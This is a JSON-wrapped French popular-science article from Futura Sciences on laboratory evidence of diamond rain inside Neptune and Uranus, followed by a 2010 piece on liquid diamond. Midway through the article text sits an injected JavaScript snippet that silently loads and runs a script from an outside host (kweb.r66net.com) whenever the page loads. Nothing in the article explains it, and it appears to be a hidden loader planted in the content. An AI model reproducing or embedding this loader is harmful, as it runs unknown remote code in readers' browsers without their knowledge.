{"title": "Dans Neptune, il pleut des diamants", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "28/08/2017", "content": "Il y aurait bien des pluies de diamants dans les planètes géantes comme Neptune ou Uranus. C'est ce que confirment des expériences réalisées dans le domaine de la physique des hautes pressions. Ce qu'il faut retenir Les modèles actuels de l'intérieur d'Uranus et Neptune conduisent à postuler que ces planètes sont composées de trois couches : un noyau rocheux intérieur, une couche intermédiaire de glaces formées d'H 2 O, de CH 4  et de NH 3  et une couche externe d'hydrogène-hélium de composition solaire. Depuis des décennies, expériences et calculs suggéraient que, dans ces géantes, à plus de 10.000 kilomètres de profondeur, le méthane (CH 4 ) subissait une transformation conduisant à la synthèse de diamants. Une démonstration solide de ce phénomène vient d'être apportée en comprimant un polymère à hautes pressions et hautes températures à l'aide d'un laser. Les modèles actuels de la structure interne des  planètes géantes  de notre Système solaire sont des héritiers de ceux proposés par l'astrophysicien américain d'origine allemande  Rupert Wildt  durant les années 1940 et 1950. Il faut cependant préciser ces modèles grâce à des expériences relevant de la physique des hautes pressions et à des simulations numériques savantes sur ordinateur. Ces modèles se nourrissent aussi de travaux purement théoriques. Ainsi, au début des années 1980 (voir l'article ci-dessous), des chercheurs états-uniens sont arrivés à la conclusion que les noyaux des planètes géantes, en particulier ceux de  Neptune  et d' Uranus , pouvaient contenir des quantités colossales de  diamants  sous forme  solide . L'enjeu est à présent de tester cette prédiction en laboratoire, sur Terre, à l'aide d'expériences faisant intervenir des matériaux comprimés à très hautes pressions grâce à des faisceaux  laser . L'une des dernières expériences en la matière a été conduite à l'aide d'un  laser  émettant dans le visible et de l'instrument  Matter in Extreme Conditions  (MEC), associé au laser à électrons libres du SLAC, le  Linac Coherent Light Source  (LCLS). L'objectif était de créer des pressions intenses grâce à des ondes de choc provoquées par l'impact des impulsions laser sur un matériau plastique, en l'occurrence du polystyrène (celui-ci est constitué d'un mélange d'atomes d'hydrogène et de  carbone  qui se trouve en très grandes quantités dans les planètes géantes, notamment sous forme de méthane). Une vue de l'intérieur du MEC, au SLAC, à Stanford, en Californie . © SLAC National Accelerator Laboratory                               Des pluies de diamants pesant des millions de carats L'objectif des chercheurs états-uniens et allemands du  Helmholtz-Zentrum Dresden-Rossendorf  n'était pas simplement de reproduire les conditions de pression et de température régnant à l'intérieur des planètes géantes, mais aussi de recréer les réactions chimiques qui s'y produisent. Mieux, ils ont voulu observer en direct ces réactions. C'est pourquoi, parallèlement à la formation et la propagation des ondes de choc dans le plastique, ce dernier a été soumis à des impulsions laser dans le domaine des rayons X durant quelques femtosecondes. Cela a permis aux physiciens de mettre en pratique une technique de diffraction des rayons X, dite «  femtoseconde  », qui permet, en quelque sorte, de prendre des instantanés des réactions produites. Cela leur a permis d'établir que des nanodiamants se forment bel et bien, mais aussi de déterminer leur taille et de les voir croître au cours du temps.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Comme les chercheurs l'expliquent dans un article publié dans  Nature ,  les résultats obtenus sont la première observation sans ambiguïté de la formation à hautes pressions de diamants dans un environnement avec des conditions similaires à celles régnant à l'intérieur de la planète Neptune (des pressions de 150 gigapascals environ et des températures de l'ordre de 5.000 kelvins), et ce en accord avec les prédictions théoriques. Le saviez-vous ? En joaillerie, le carat est une unité de masse utilisée pour les gemmes. Il est égal à 200 mg, soit 5 carats pour 1 gramme. Il ne doit pas être confondu avec le carat des bijoutiers, qui, lui, désigne la pureté d'un métal précieux, comme l'or par exemple. Les diamants synthétisés durant ces expériences sont de taille nanométrique. Toutefois, tout indique qu'à l'intérieur de planètes géantes comme Uranus et Neptune, les diamants formés sont en réalité beaucoup plus grands, pouvant atteindre des poids de plusieurs millions de carats. Au cours de milliers d'années, ces diamants doivent s'enfoncer lentement dans les couches de glace entourant le cœur rocheux des planètes géantes. Au final, de véritables couches de diamants doivent très probablement se former autour du cœur de ces géantes, à partir de pluies de diamants se formant à 10.000 kilomètres sous la surface d'Uranus et de Neptune. Ces expériences ne sont pas simplement intéressantes du point de vue des matériaux à hautes pressions et de l'astrophysique, qu'il s'agisse des planètes géantes du Système solaire ou des exoplanètes qui leur ressemblent et qui sont situées ailleurs dans la Voie lactée. En effet, cette technique de synthèse de nanodiamants pourrait avoir des applications technologiques intéressantes dans le domaine de la  médecine  ou de l'électronique ; de tels nanodiamants sont aujourd'hui produits à l'aide d'explosion et ils sont commercialisés. Une voie de synthèse à l'aide de laser pourrait ainsi offrir des perspectives plus intéressantes en termes de coût. Ce travail pourrait aussi avoir des applications dans le domaine de la  fusion contrôlée inertielle , où ce sont des billes de carburant thermonucléaire contenant du deutérium et enrobées dans des couches de plastique qui sont utilisées. Pour en savoir plus Du diamant fondu à l'intérieur de Neptune ? Article de Laurent Sacco publié le 20/01/2010 Il y a presque trente ans, deux chercheurs montraient que les noyaux des planètes géantes comme Neptune et Uranus pouvaient contenir des quantités colossales de diamants sous forme solide. Des expériences montrent aujourd'hui qu'on peut imaginer des océans de diamant  liquide  parcourus d'icebergs... Lorsque les Beatles chantaient  Lucy in the Sky with Diamonds , ils ne savaient probablement pas qu'il existait effectivement des  nanodiamants  flottant dans les espaces interstellaires et que l'on retrouve même dans certaines  météorites . En 1981,  Marvin Ross  a été un des premiers à proposer qu'à l'intérieur des planètes géantes que sont Neptune et Uranus de véritables cœurs en diamant devaient pouvoir se former sous l'action des pressions énormes agissant sur les composés carbonés détectés dans leurs  atmosphères . L'idée avait été reprise et poussée plus loin dans les romans d' Arthur Clarke  faisant suite à  2001 : L'Odyssée de l'espace . Après le contact de David Bowman avec le  monolithe  noir laissé il y a des millions d'années par une race d'extraterrestres au voisinage de  Jupiter , l'esprit de l' astronaute  avait été téléchargé dans un réseau de flux de  lumière  intégré à la structure en  écume  d'un  espace-temps  à plus de 4 dimensions. Ainsi dématérialisé, le nouveau Bowman se promenait à sa guise dans l'espace et découvrait en effet qu'un cœur en diamant occupait l'intérieur de la planète géante. La planète Neptune vue par la sonde Voyager 2. © Nasa                               L'idée qu'un  astre  puisse avoir un cœur en diamant n'est pas une spéculation de théoricien débridé. On savait par exemple depuis longtemps que le cœur d'une  naine blanche  composé de carbone devait finir par se cristalliser avec le temps et le refroidissement de l' étoile . Or, en 2004, un groupe d'astrophysiciens étudiant les pulsations d'une naine blanche située à environ 50  années-lumière  dans la  constellation  du centaure,  BPM 37093 , annonçait que les méthodes de l'astérosismologie conduisaient à admettre qu'une fraction importante de la naine blanche avait bel et bien cristallisée sous forme de diamant. Aujourd'hui, un groupe de chercheurs du  Lawrence Livermore National Laboratory  a publié dans  Nature  les résultats d'études portant sur le point de  fusion  du carbone à hautes pressions. D'ordinaire, une phase liquide du diamant n'est pas observée en laboratoire car celui-ci se transforme alors en  graphite  avant que ne débute la fusion. Toutefois, en exerçant des pressions de l'ordre de 40 millions d'atmosphère à l'aide de faisceaux laser, il est possible d'obtenir une  transition de phase  partant du diamant solide plutôt que du graphite. À leur surprise, une fois du liquide obtenu et alors que la pression baissait pour atteindre 11 millions d'atmosphères et que la température baissait aussi pour atteindre les 50.000 K, les chercheurs ont observé que non seulement des fragments de diamant solide réapparaissaient mais qu'ils flottaient, tels des icebergs à la surface du liquide. Neptune et Uranus sont composées d'environ 10 % de carbone et des conditions similaires aux précédentes doivent exister à grandes profondeurs dans ces planètes. Ils pourraient donc s'y trouver d'énormes icebergs en diamant flottant sur du carbone liquide. ", "theme": "sciences"}